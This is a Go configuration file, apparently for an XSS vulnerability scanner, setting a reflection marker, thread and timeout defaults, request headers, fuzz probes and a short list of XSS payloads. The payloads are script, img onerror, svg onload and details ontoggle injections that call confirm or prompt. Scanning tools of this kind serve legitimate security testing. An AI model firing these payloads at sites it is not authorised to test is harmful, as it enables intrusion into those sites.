package config

const (
	XSSChecker         = "v3dm0s"
	DefaultDelay       = 0
	DefaultThreadCount = 10
	DefaultTimeout     = 10
)

var DefaultHeaders = map[string]string{
	"User-Agent":                "$",
	"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language":           "en-US,en;q=0.5",
	"Accept-Encoding":           "gzip,deflate",
	"Connection":                "close",
	"DNT":                       "1",
	"Upgrade-Insecure-Requests": "1",
}

var DefaultFuzzes = []string{
	"<test",
	"<test//",
	"<test>",
	"<test x>",
	"\">payload<br/attr=\"",
	"\"-confirm``-\"",
}

var DefaultPayloads = []string{
	"\"</Script><Html Onmouseover=(confirm)()//",
	"<img src=x onerror=confirm(1)>",
	"<svg/onload=confirm()>",
	"<details open ontoggle=confirm()>",
	"<script>prompt(1)</script>",
}
